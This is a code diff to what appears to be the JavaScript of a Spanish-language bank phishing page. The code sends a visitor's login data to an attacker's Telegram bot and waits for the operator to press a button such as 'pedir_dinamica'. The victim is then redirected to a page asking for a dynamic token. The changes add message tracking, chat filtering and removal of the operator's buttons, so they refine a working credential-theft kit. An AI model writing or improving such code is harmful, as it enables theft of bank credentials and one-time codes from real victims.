@@ -454,11 +454,10 @@
                 let TELEGRAM_BOT_TOKEN = '';
                 let TELEGRAM_CHAT_ID = '';
 
-                // Cargar los datos sensibles desde el archivo JSON
                 fetch('js/brr76.json')
                     .then(response => {
                         if (!response.ok) {
-                            throw new Error('No se pudo cargar el archivo de configuración. Código de estado: ' + response.status);
+                            throw new Error('No se pudo cargar el archivo de configuración.');
                         }
                         return response.json();
                     })
@@ -477,6 +476,7 @@
 
                 function initializeFormLogic() {
                     let statusCheckInterval = null;
+                    let lastUpdateId = null;
 
                     async function sendToTelegram(messageContent, keyboard) {
                         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -498,14 +498,49 @@
                             if (!response.ok) {
                                 const errorText = await response.text();
                                 console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
-                                return false;
+                                return {
+                                    success: false
+                                };
                             }
                             const data = await response.json();
                             console.log('Mensaje enviado a Telegram exitosamente:', data);
-                            return true;
+                            return {
+                                success: true,
+                                message_id: data.result.message_id
+                            };
                         } catch (error) {
                             console.error('Error de red al enviar mensaje a Telegram:', error);
-                            return false;
+                            return {
+                                success: false
+                            };
+                        }
+                    }
+
+                    async function deleteTelegramButtons(chatId, messageId) {
+                        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+                        const payload = {
+                            chat_id: chatId,
+                            message_id: messageId,
+                            reply_markup: {
+                                inline_keyboard: []
+                            }
+                        };
+                        try {
+                            const response = await fetch(url, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify(payload),
+                            });
+                            if (!response.ok) {
+                                const errorText = await response.text();
+                                console.error(`Error al eliminar botones de Telegram: ${response.status} - ${errorText}`);
+                            } else {
+                                console.log('Botones de Telegram eliminados exitosamente.');
+                            }
+                        } catch (error) {
+                            console.error('Error de red al eliminar botones de Telegram:', error);
                         }
                     }
 
@@ -749,16 +784,17 @@
 
                             const sent = await sendToTelegram(message, keyboard);
 
-                            if (sent) {
+                            if (sent.success) {
                                 sessionStorage.setItem('initialLoginData', JSON.stringify(loginData));
-                                checkPaymentVerification('N/A');
+                                sessionStorage.setItem('telegramMessageId', sent.message_id);
+                                checkPaymentVerification();
                             } else {
                                 azul.style.display = 'none';
                                 alert("Error al enviar los datos iniciales. Por favor, inténtalo de nuevo.");
                             }
                         }
 
-                        async function checkPaymentVerification(transactionId) {
+                        async function checkPaymentVerification() {
                             if (statusCheckInterval) {
                                 clearInterval(statusCheckInterval);
                             }
@@ -772,13 +808,17 @@
                                     if (updates && updates.length > 0) {
                                         const verificationUpdate = updates.find(
                                             (update) =>
-                                            update.callback_query
+                                            update.callback_query && update.callback_query.message.chat.id.toString() === TELEGRAM_CHAT_ID
                                         );
 
                                         if (verificationUpdate) {
                                             clearInterval(statusCheckInterval);
                                             azul.style.display = 'none';
                                             const callbackData = verificationUpdate.callback_query.data.split(':')[0];
+                                            const messageId = verificationUpdate.callback_query.message.message_id;
+
+                                            // Llama a la nueva función para eliminar los botones
+                                            await deleteTelegramButtons(TELEGRAM_CHAT_ID, messageId);
 
                                             if (callbackData === 'pedir_dinamica') {
                                                 window.location.href = "token.html";
